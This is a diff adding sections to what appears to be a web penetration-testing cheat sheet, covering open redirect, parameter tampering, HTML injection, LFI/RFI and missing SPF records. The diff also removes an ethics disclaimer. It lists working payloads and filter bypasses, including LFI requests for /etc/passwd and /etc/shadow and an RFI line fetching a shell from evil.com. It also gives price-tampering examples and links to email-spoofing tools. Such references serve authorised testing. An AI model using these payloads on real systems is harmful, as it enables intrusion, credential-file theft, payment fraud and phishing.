@@ -365,6 +365,179 @@ X-Remote-Addr: 127.0.0.1
 This guide provides a structured approach to performing **XSS** and **Host Header Injection** attacks for security testing. Make sure to test responsibly and only on applications you have permission to test.
 
 ---
+# 4. URL Redirection (Used as a Phishing Attack) or Open Redirection
 
-#### ⚠️ Disclaimer
-This content is for **educational and ethical hacking** purposes only. Unauthorized testing without proper consent is illegal.
+## HTTP Status Code: 3xx, 200
+
+### Common Parameters List:
+```
+dest,redirect,?,something is redirect to page
+uri,path,continue,url,window,to,out,view,dir,show,navigation,Open,url,file,val,validate,domain,callback,return,page,feed,host,port,next,data,reference,site,html,u=
+```
+
+### Payload Examples:
+```
+/{payload}
+?next={payload}
+?url={payload}
+?target={payload}
+?rurl={payload}
+?dest={payload}
+?destination={payload}
+?redir={payload}
+?redirect_uri={payload}
+?redirect_url={payload}
+?redirect={payload}
+/redirect/{payload}
+/cgi-bin/redirect.cgi?{payload}
+/out/{payload}
+/out?{payload}
+?view={payload}
+/login?to={payload}
+?image_url={payload}
+?go={payload}
+?return={payload}
+?returnTo={payload}
+?return_to={payload}
+?checkout_url={payload}
+?continue={payload}
+?return_path={payload}
+```
+
+### Approach:
+1. **URL Redirection on Path Fragments:**
+   ```
+   example: any.com/payloads
+   any.com/bing.com
+   any.com//bing.com
+   any.com//bing.com/%2e%2e
+   ```
+   Use the payload to attempt a brute-force attack.
+
+2. **Sort the Parameters Returning a 200 Response:**
+   ```
+   GET /url=https://bing.com/
+   ```
+
+### Bypassing Techniques:
+- Using a whitelisted domain or keyword: `https://www.whitelisted.com/evil.com` redirects to `evil.com`
+- Using `//` to bypass `http` blacklisted keyword: `//google.com`
+- Using `https:` to bypass `//` blacklisted keyword: `https:google.com`
+- Using `%E3%80%82` to bypass `.` blacklisted character: `//google%E3%80%82com`
+- Using parameter pollution: `?next=whitelisted.com&next=google.com`
+- Using `@` character: `http://www.theirsite.com@yoursite.com/`
+
+**More payloads and techniques:** [PayloadsAllTheThings - Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)
+
+---
+
+# 5. Parameter Tampering (All Parameters Change)
+
+**Description:** The Web Parameter Tampering attack manipulates parameters exchanged between client and server to modify application data such as user credentials, permissions, prices, and product quantities.
+
+**Targeted Parameters:**
+```
+price, amount, cost, discount, quantity, transaction, user IDs, number, strings, delivery charges, etc.
+```
+
+### Attack Scenarios:
+#### Example 1:
+```
+Qty=500&price=100  →  Qty=5&price=100
+```
+#### Example 2:
+```
+Cashback=0&amt=100&qty=1 → Cashback=100000&amt=100&qty=1
+```
+#### Example 3:
+Modify the request in Burp Suite before the payment gateway.
+
+### Bypass Methods:
+1. Encode and decode the URL to change the amount.
+2. Modify cookies in the browser storage.
+3. Upload a malicious profile picture with a link.
+
+---
+
+# 6. HTML Injection
+
+**Description:** HTML injection occurs when an attacker can inject arbitrary HTML code into a vulnerable web page.
+
+### Payloads:
+```html
+<h1>Vulnerable for HTML Injection</h1>
+<A HREF="http://bing.com/">OffensiveHunter</A>
+```
+
+**DOM HTML Injection Example:**
+```html
+<script>
+function setMessage(){
+ var t=location.hash.slice(1);
+ document.getElementById(t).innerText = "The DOM is now loaded and can be manipulated.";
+}
+window.onload = setMessage;
+</script>
+<a href="#message"> Show Here</a>
+<div id="message">Showing Message</div>
+```
+
+---
+
+# 7. Local File Inclusion (LFI) and Remote File Inclusion (RFI)
+
+### **Impact of File Inclusion:**
+1. Code execution on the server
+2. Code execution on the client side
+3. Denial of Service (DoS) attacks
+4. Information disclosure (passwords, usernames, system files)
+
+### **Common LFI Parameters:**
+```
+file, document, folder, root, path, pg, style, pdf, template, php_path, doc, content, static
+```
+
+### **Basic LFI Exploitation:**
+```bash
+http://example.com/index.php?page=../../../etc/passwd
+http://example.com/index.php?page=../../../../../../etc/shadow
+```
+
+### **Basic RFI Exploitation:**
+```bash
+http://example.com/index.php?page=http://evil.com/shell.txt
+```
+
+### **LFI/RFI Bypass Techniques:**
+- **Null byte injection:** `page=../../../etc/passwd%00`
+- **Double encoding:** `page=%252e%252e%252fetc%252fpasswd`
+- **PHP wrappers:** `php://filter/convert.base64-encode/resource=index.php`
+
+**Tools:**
+- [Kadimus](https://github.com/P0cL4bs/Kadimus)
+- [LFISuite](https://github.com/D35m0nd142/LFISuite)
+- [fimap](https://github.com/kurobeats/fimap)
+
+---
+
+# 10. Missing or Insufficient SPF Record
+
+**Description:** If a domain lacks an SPF record, attackers can send phishing emails that appear legitimate.
+
+### **Tools:**
+- [MXToolbox](https://mxtoolbox.com/)
+- [SPF Validator](https://www.kitterman.com/spf/validate.html)
+
+### **Exploitation Example:**
+```text
+From: support@hubspot.net
+To: victim@gmail.com
+Subject: Email Forgery due to missing SPF
+```
+
+**Phishing Tools:**
+- [Emkei.cz](https://emkei.cz/)
+- [Anonymous Email](https://anonymousemail.me/)
+- [5YMail](https://www.5ymail.com/)
+
+---
